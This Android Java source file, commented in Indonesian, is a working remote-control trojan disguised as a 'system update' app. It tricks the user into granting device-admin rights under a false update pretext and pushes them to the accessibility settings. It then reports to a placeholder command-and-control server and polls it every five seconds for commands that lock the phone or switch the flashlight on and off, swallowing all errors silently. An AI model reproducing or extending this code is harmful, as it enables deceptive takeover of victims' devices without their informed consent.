package com.system.update;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import androidx.appcompat.app.AppCompatActivity;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {
    // GANTI IP_LO DENGAN LINK CLOUDFLARE / IP TERMUX
    private String C2_SERVER = "http://IP_LO:8080/command";
    private String REPORT_URL = "http://IP_LO:8080/report";
    
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, MyAdmin.class);
        
        // 1. Minta Izin Admin (Lock Screen)
        try {
            if (!dpm.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk update sistem.");
                startActivity(intent);
            }
        } catch (Exception e) {}

        // 2. Jeda 3 detik sebelum minta Izin Accessibility (biar ga FC)
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    startActivity(accIntent);
                } catch (Exception e) {}
            }
        }, 3000);

        // 3. Laporin IP ke Server (Pake Thread)
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(REPORT_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setConnectTimeout(5000);
                    conn.getResponseCode();
                } catch (Exception e) {}
            }
        }).start();

        // 4. Loop Cek Command dari Server (Pake Timer)
        Timer timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkCommand();
            }
        }, 5000, 5000); // Delay 5 detik pertama, cek tiap 5 detik
    }

    private void checkCommand() {
        try {
            URL url = new URL(C2_SERVER);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            
            if (conn.getResponseCode() == 200) {
                InputStream is = conn.getInputStream();
                Scanner s = new Scanner(is).useDelimiter("\\A");
                String command = s.hasNext() ? s.next() : "";
                s.close();

                if (command.equals("LOCK")) {
                    dpm.lockNow();
                } else if (command.equals("FLASH_ON")) {
                    toggleFlash(true);
                } else if (command.equals("FLASH_OFF")) {
                    toggleFlash(false);
                }
            }
        } catch (Exception e) {
            // Silent fail (jangan crash kalau server mati)
        }
    }

    private void toggleFlash(boolean status) {
        try {
            CameraManager camManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String cameraId = camManager.getCameraIdList()[0];
            camManager.setTorchMode(cameraId, status);
        } catch (Exception e) {}
    }
}
